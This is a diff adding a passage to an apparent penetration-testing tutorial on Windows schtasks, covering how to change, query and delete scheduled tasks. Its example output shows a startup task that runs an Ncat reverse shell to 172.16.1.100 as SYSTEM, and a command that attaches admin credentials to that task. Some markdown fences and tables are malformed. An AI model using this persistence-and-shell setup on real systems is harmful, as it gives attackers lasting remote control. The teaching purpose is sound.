@@ -130,3 +130,75 @@ Change Syntax
 
 | Action | Parameter | Description |
 | ------ | --------- | ----------- |
+
+```markdown
+--------- | ----------- |
+| Change | | Allows for modifying existing scheduled tasks. |
+| /tn | | Designates the task to change |
+| /tr | | Modifies the program or action that the task runs. |
+| /ENABLE| | Change the state of the task to Enabled. |
+| /DISABLE| | Change the state of the task to Disabled. |
+
+Ok, now let us say we found the hash of the local admin password and want to use it to spawn our Ncat shell for us; if anything happens, we can modify the task like so to add in the credentials for it to use.
+```
+
+C:\htb> schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"
+
+SUCCESS: The parameters of scheduled task "My Secret Task" have been changed.
+
+```
+
+Now to make sure our changes took, we can query for the specific task using the `/tn` parameter and see:
+
+```
+
+C:\htb> schtasks /query /tn "My Secret Task" /V /fo list
+
+Folder: \
+HostName: DESKTOP-Victim
+TaskName: \My Secret Task
+Next Run Time: N/A
+Status: Ready
+Logon Mode: Interactive/Background
+Last Run Time: 11/30/1999 12:00:00 AM
+Last Result: 267011
+Author: DESKTOP-victim\htb-admin
+Task To Run: C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100
+Start In: N/A
+Comment: N/A
+Scheduled Task State: Enabled
+Idle Time: Disabled
+Power Management: Stop On Battery Mode, No Start On Batteries
+Run As User: SYSTEM
+Delete Task If Not Rescheduled: Disabled
+Stop Task If Runs X Hours and X Mins: 72:00:00
+Schedule: Scheduling data is not available in this format.
+Schedule Type: At system start up
+
+<SNIP>  
+```
+
+It looks like our changes were saved successfully. Managing tasks and making changes is pretty simple. We need to ensure our syntax is correct, or it may not fire. If we want to ensure it works, we can use the `/run` parameter to kick the task off immediately. We have queried, created, and changed tasks up to this point. Let us look at how to delete them now.
+
+### Delete the Scheduled Task(s)
+
+Delete Syntax
+
+| Action | Parameter | Description                                               |
+| ------ | --------- | --------------------------------------------------------- |
+| Delete |           | Remove a task from the schedule                           |
+| /tn    |           | Identifies the task to delete.                            |
+| /s     |           | Specifies the name or IP address to delete the task from. |
+| /u     |           | Specifies the user to run the task as.                    |
+| /p     |           | Specifies the password to run the task as.                |
+| /f     |           | Stops the confirmation warning.                           |
+
+```
+C:\htb> schtasks /delete  /tn "My Secret Task"
+
+WARNING: Are you sure you want to remove the task "My Secret Task" (Y/N)?
+```
+
+Running `schtasks /delete` is simple enough. The thing to note is that if we do not supply the `/F` option, we will be prompted, like in the example above, for you to supply input. Using `/F` will delete the task and suppress the message.
+
+Schtasks can be a great way to leverage the host to run actions for us as admins and pentesters. Take some time to practice creating, modifying, and deleting tasks. By now, we should be comfortable with `cmd.exe` and its workings. Let's level up and start working in PowerShell!
